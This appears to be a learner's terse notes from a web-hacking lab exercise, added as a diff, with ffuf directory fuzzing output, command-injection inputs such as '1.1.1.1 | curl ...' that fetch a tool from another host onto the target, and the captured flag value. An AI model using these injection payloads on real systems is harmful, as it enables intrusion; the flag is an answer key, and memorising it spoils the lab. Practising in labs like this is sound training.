@@ -1,0 +1,45 @@
+hostname -I 
+
+172.20.0.3 
+
+
+172.20.0.2
+
+
+1.1.1.1 | curl 172.19.0.1:3000/gost --output gost
+
+http_proxy=127.0.0.1:1338 ffuf -w ~/Repositories/YAWR/Web/files_and_directories/fuzz.txt -u http://172.19.0.3/FUZZ -fc 403
+
+
+ :: Method           : GET
+ :: URL              : http://172.20.0.3/FUZZ
+ :: Wordlist         : FUZZ: /home/vit81/Documents/stepik/wh/fuzz.txt
+ :: Follow redirects : false
+ :: Calibration      : false
+ :: Timeout          : 10
+ :: Threads          : 40
+ :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
+ :: Filter           : Response status: 403
+________________________________________________
+
+server-status           [Status: 200, Size: 5489, Words: 242, Lines: 99, Duration: 0ms]
+                        [Status: 200, Size: 2720, Words: 687, Lines: 86, Duration: 253ms]
+index.php               [Status: 200, Size: 2720, Words: 687, Lines: 86, Duration: 233ms]
+%2e                     [Status: 200, Size: 2720, Words: 687, Lines: 86, Duration: 289ms]
+:: Progress: [4107/4107] :: Job [1/1] :: 19 req/sec :: Duration: [0:00:10] :: Errors: 0 ::
+                                                                                                      
+┌──(vit81㉿kali)-[~/Documents/stepik/wh]
+└─$ http_proxy=127.0.0.1:1338 ffuf -w ./fuzz.txt -u http://172.20.0.2/FUZZ -fc 403
+
+
+# решение
+1.1.1.1 | curl 172.20.0.2/.dev
+
+  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+
+  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0
+100    42  100    42    0     0  42000      0 --:--:-- --:--:-- --:--:-- 42000
+	Flag is: f8404cc6244e930ced3ee0107aef968b
+	
+# Flag is: f8404cc6244e930ced3ee0107aef968b
